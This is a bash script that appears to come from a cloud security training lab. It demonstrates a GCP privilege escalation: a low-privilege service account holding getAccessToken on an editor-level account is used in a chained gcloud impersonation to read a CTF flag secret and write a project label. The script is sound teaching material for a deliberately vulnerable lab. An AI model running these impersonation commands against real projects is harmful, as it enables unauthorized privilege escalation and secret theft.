#!/bin/bash

# Demo script for gcp-iam-001-iam-serviceaccountsgetaccesstoken privilege escalation
#
# Attack: starting_sa holds iam.serviceAccounts.getAccessToken on target_sa
# (via a minimal custom role). It calls generateAccessToken to mint a
# short-lived OAuth token for target_sa and inherit its roles/editor project
# permissions.
#
# Credential model (no static SA keys):
#   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
#   Demo commands pass --impersonate-service-account=starting_sa to run as it.
#   The exploit then chains impersonation to target_sa, which holds roles/editor.

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# commands that show individual hops but are not the actual exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-IAM-001: Service Account Access Token Generation Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_one_hop_to_admin_gcp_iam_001_iam_serviceaccountsgetaccesstoken.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT" | jq -r '.starting_sa_email')
TARGET_SA_EMAIL=$(echo "$MODULE_OUTPUT"   | jq -r '.target_sa_email')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"    | jq -r '.flag_secret_id')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"    | jq -r '.deployer_email')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)

cd - > /dev/null

for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

echo "Starting SA (no project role): $STARTING_SA_EMAIL"
echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
echo "Project:                       $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if our current gcloud CLI identity differs from the deployer that
# terraform provisioned. Terraform's ADC-derived deployer identity and the
# gcloud CLI session are two separate credential stores; a mismatch means
# every --impersonate-service-account call below will fail with a permission
# error, so stop now with actionable remediation instead of failing deep into
# the demo.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

echo -e "${YELLOW}Waiting for IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

# Step 2: Verify starting SA has no project role of its own
# We impersonate starting_sa and try to read the flag — it should be denied.
echo -e "${YELLOW}Step 2: Confirming starting SA has no project-level privilege${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"

if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the secret — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no project role, as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 3: Chain impersonation starting_sa → target_sa
#
# gcloud's --impersonate-service-account accepts a comma-separated delegation
# chain. Each principal must hold iam.serviceAccounts.getAccessToken on the next:
#   your ADC → (roles/iam.serviceAccountTokenCreator) → starting_sa
#            → (minimal custom role: getAccessToken) → target_sa  [THE VULNERABILITY]
# gcloud resolves the full chain internally and executes the command as the
# last SA in the list. The intermediate tokens are never exposed.
#
# Steps 3a and 3b below mint tokens for each hop individually to make the
# chain visible — they are NOT needed for the attack. Step 3c is the actual
# exploit: the full delegation chain in a single gcloud command.
echo -e "${YELLOW}Step 3: [EXPLOIT] Chaining impersonation starting_sa → target_sa → flag${NC}"

# Step 3a: [ILLUSTRATIVE] Mint a token as starting_sa to show hop 1 is possible.
# The token is printed and discarded — subsequent commands re-derive it
# internally. This step is here to make the first link in the chain visible.
echo -e "\n${DIM}Step 3a (illustrative — shows hop 1 works, not needed for the attack):${NC}"
show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
    "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL"
STARTING_SA_TOKEN=$(gcloud auth print-access-token \
    --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
if [ -z "$STARTING_SA_TOKEN" ]; then
    echo -e "${RED}✗ Failed to mint token for starting SA${NC}"
    echo "Check that $DEPLOYER_EMAIL holds serviceAccountTokenCreator on $STARTING_SA_EMAIL"
    exit 1
fi
echo -e "${GREEN}✓ Minted short-lived token for $STARTING_SA_EMAIL (hop 1 confirmed)${NC}"

# Step 3b: [ILLUSTRATIVE] Mint a token via the full chain to show hop 2 is possible.
# Again, this token is discarded. Step 3c re-derives it as part of the real command.
echo -e "\n${DIM}Step 3b (illustrative — shows hop 2 works, not needed for the attack):${NC}"
show_illustrative_cmd "$STARTING_SA_EMAIL" \
    "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
TARGET_SA_TOKEN=$(gcloud auth print-access-token \
    --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" 2>/dev/null)
if [ -z "$TARGET_SA_TOKEN" ]; then
    echo -e "${RED}✗ Failed to chain impersonation to target SA${NC}"
    echo "Check that $STARTING_SA_EMAIL holds iam.serviceAccounts.getAccessToken on $TARGET_SA_EMAIL"
    exit 1
fi
echo -e "${GREEN}✓ Chained impersonation to $TARGET_SA_EMAIL (hop 2 confirmed)${NC}"

# Step 3c: [THE ATTACK] Read the flag as target_sa using the full delegation chain.
# gcloud resolves starting_sa → target_sa internally — no separate token step
# needed. This single command is the complete exploit.
echo -e "\n${DIM}Step 3c (the actual attack — full chain in one command):${NC}"
show_attack_cmd "$TARGET_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"

FLAG_VALUE=$(gcloud secrets versions access latest \
    --secret="$FLAG_SECRET_ID" \
    --project="$PROJECT_ID" \
    --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" 2>/dev/null)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}✗ Failed to read flag via impersonation chain${NC}"
    echo "Check that starting_sa holds iam.serviceAccounts.getAccessToken on $TARGET_SA_EMAIL"
    exit 1
fi
echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via chained impersonation${NC}\n"

# Step 4: [THE ATTACK] Confirm editor-level write access (beyond just reading a secret).
# Same full delegation chain — target_sa holds roles/editor on the project.
echo -e "${YELLOW}Step 4: [EXPLOIT] Verifying full roles/editor access via target SA (write proof)${NC}"
show_attack_cmd "$TARGET_SA_EMAIL" \
    "gcloud projects update $PROJECT_ID --update-labels=pl-privesc-verified=true --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"

if gcloud projects update "$PROJECT_ID" \
        --update-labels=pl-privesc-verified=true \
        --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
        --quiet 2>/dev/null; then
    echo -e "${GREEN}✓ Successfully wrote a project label as $TARGET_SA_EMAIL!${NC}"
    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
    gcloud projects update "$PROJECT_ID" \
        --remove-labels=pl-privesc-verified \
        --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
        --quiet 2>/dev/null || true
else
    echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
fi
echo ""

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. ADC identity ($DEPLOYER_EMAIL) acted as $STARTING_SA_EMAIL, which acted as"
echo "   $TARGET_SA_EMAIL (roles/editor + secretAccessor) to read the CTF flag"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (iam.serviceAccounts.getAccessToken on target_sa, via minimal custom role — THE VULNERABILITY)"
echo "    -> $TARGET_SA_EMAIL"
echo "    -> (roles/editor on project $PROJECT_ID)"
echo "    -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$(dirname "$0")/.demo_active"
